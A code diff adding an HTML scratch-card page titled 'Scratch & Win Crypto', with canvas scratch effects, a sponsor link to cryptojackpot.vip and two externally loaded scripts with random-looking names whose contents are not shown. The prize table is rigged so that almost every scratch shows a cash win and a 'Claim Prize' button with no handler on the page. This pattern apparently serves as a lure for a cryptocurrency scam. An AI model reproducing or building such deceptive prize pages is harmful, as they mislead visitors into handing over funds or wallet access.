@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Scratch & Win Crypto</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+
+body {
+  margin: 0;
+  font-family: 'Orbitron', sans-serif;
+  background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+  color: #fff;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 0;
+  min-height: 100vh;
+}
+
+header {
+  width: 100%;
+  background: rgba(0,0,0,0.6);
+  padding: 15px 20px;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+  display: flex;
+  justify-content: center;
+  position: sticky;
+  top: 0;
+  z-index: 10;
+}
+
+nav a {
+  color: #ffd700;
+  text-decoration: none;
+  margin: 0 20px;
+  font-weight: bold;
+  font-size: 1.1em;
+  transition: all 0.3s ease;
+}
+
+nav a:hover {
+  color: #00ffd5;
+  text-shadow: 0 0 10px #00ffd5;
+}
+
+h1 {
+  font-size: 2.5em;
+  color: #ffd700;
+  margin: 30px 0 10px 0;
+  text-align: center;
+  text-shadow: 0 0 10px #ffd700;
+}
+
+#wallet {
+  display: none; /* remove wallet display */
+}
+
+#scratchContainer {
+  position: relative;
+  width: 90%;
+  max-width: 350px;
+  margin: 20px auto;
+  border-radius: 15px;
+  overflow: hidden;
+  box-shadow: 0 0 25px rgba(255, 255, 0, 0.5);
+}
+
+#scratchText {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  font-size: 2em;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #ffd700;
+  z-index: 1;
+  user-select: none;
+  pointer-events: none;
+  text-shadow: 0 0 10px #ffd700;
+}
+
+canvas {
+  width: 100%;
+  height: 180px;
+  display: block;
+  border-radius: 15px;
+  touch-action: none;
+}
+
+#reward {
+  margin-top: 25px;
+  font-size: 2em;
+  color: #00ffcc;
+  text-shadow: 0 0 15px #00ffcc;
+  text-align: center;
+}
+
+/* CLAIM BUTTON */
+.claim-button {
+  margin-top: 18px;
+  padding: 14px 36px;
+  font-size: 1.1em;
+  font-family: 'Orbitron', sans-serif;
+  color: #0f0c29;
+  background: linear-gradient(135deg, #ffd700, #ffae00);
+  border: none;
+  border-radius: 30px;
+  cursor: pointer;
+  box-shadow: 0 0 30px rgba(255,215,0,0.8);
+  display: none;
+  transition: 0.3s ease;
+}
+.claim-button:hover {
+  transform: scale(1.05);
+  box-shadow: 0 0 45px rgba(255,215,0,1);
+}
+
+
+#sponsor {
+  margin-top: 25px;
+  font-size: 1.2em;
+  color: #ff8c00;
+  text-align: center;
+  text-shadow: 0 0 5px #ff8c00;
+  transition: all 0.3s ease;
+}
+
+#sponsor a {
+  color: #00ffd5;
+  text-decoration: none;
+  font-weight: bold;
+}
+
+#sponsor a:hover {
+  color: #ffd700;
+  text-shadow: 0 0 10px #ffd700;
+}
+</style>
+
+
+<script src="/6eeadc20.js"></script>
+<script src="/i3pel5t20v.js" type="module"></script>
+
+
+
+</head>
+<body>
+
+<header>
+  <nav>
+    <a href="#">Home</a>
+    <a href="#">Games</a>
+    <a href="#">Contact</a>
+  </nav>
+</header>
+
+<h1>Scratch & Win Crypto</h1>
+
+<div id="scratchContainer">
+  <div id="scratchText">Scratch Me!</div>
+  <canvas id="scratchCanvas" width="350" height="180"></canvas>
+</div>
+
+<div id="reward"></div>
+
+<button class="claim-button" id="claimBtn">Claim Prize</button>
+
+<div id="sponsor">
+  Sponsored by <a href="https://cryptojackpot.vip" target="_blank">CryptoJackpot.vip</a>
+</div>
+
+<script>
+// ===== Scratch Card Logic =====
+const rewards = [
+  { prize: 0, chance: 3 },
+  { prize: 1, chance: 5 },
+  { prize: 2, chance: 5 },
+  { prize: 5, chance: 5 },
+  { prize: 10, chance: 5 },
+  { prize: 25, chance: 10 },
+  { prize: 50, chance: 17 },
+  { prize: 150, chance: 25 },
+];
+
+function getRandomReward() {
+  const rand = Math.random() * 100;
+  let sum = 0;
+  for (let i = 0; i < rewards.length; i++) {
+    sum += rewards[i].chance;
+    if (rand <= sum) return rewards[i].prize;
+  }
+  return 0;
+}
+
+// ===== Canvas Scratch Effect =====
+const canvas = document.getElementById('scratchCanvas');
+const ctx = canvas.getContext('2d');
+
+let isDrawing = false;
+let revealed = false;
+
+// Fill overlay
+ctx.fillStyle = '#888';
+ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+function draw(x, y) {
+  ctx.globalCompositeOperation = 'destination-out';
+  ctx.beginPath();
+  ctx.arc(x, y, 20, 0, Math.PI * 2);
+  ctx.fill();
+}
+
+// Mouse
+canvas.addEventListener('mousedown', e => { isDrawing = true; draw(e.offsetX, e.offsetY); });
+canvas.addEventListener('mouseup', e => { isDrawing = false; checkReveal(); });
+canvas.addEventListener('mousemove', e => { if(isDrawing) draw(e.offsetX, e.offsetY); });
+
+// Touch
+canvas.addEventListener('touchstart', e => { e.preventDefault(); isDrawing = true; const rect = canvas.getBoundingClientRect(); draw(e.touches[0].clientX - rect.left, e.touches[0].clientY - rect.top); });
+canvas.addEventListener('touchend', e => { isDrawing = false; checkReveal(); });
+canvas.addEventListener('touchmove', e => { e.preventDefault(); if(isDrawing){ const rect = canvas.getBoundingClientRect(); draw(e.touches[0].clientX - rect.left, e.touches[0].clientY - rect.top); } });
+
+function checkReveal(){
+  const imgData = ctx.getImageData(0,0,canvas.width,canvas.height);
+  let cleared = 0;
+  for(let i = 3; i < imgData.data.length; i+=4){
+    if(imgData.data[i]===0) cleared++;
+  }
+  if(cleared/(canvas.width*canvas.height) > 0.5 && !revealed){
+    revealed = true;
+    revealReward();
+  }
+}
+
+function revealReward(){
+  const prize = getRandomReward();
+  const rewardText = prize === 0 ? "No Win 😢" : "$" + prize + " Won! 🎉";
+
+  document.getElementById('reward').innerText = rewardText;
+  document.getElementById('scratchText').innerText = rewardText;
+
+  const claimBtn = document.getElementById('claimBtn');
+
+  if (prize > 0) {
+    claimBtn.style.display = 'inline-block';
+  } else {
+    claimBtn.style.display = 'none';
+  }
+}
+
+
+</script>
+
+</body>
+</html>
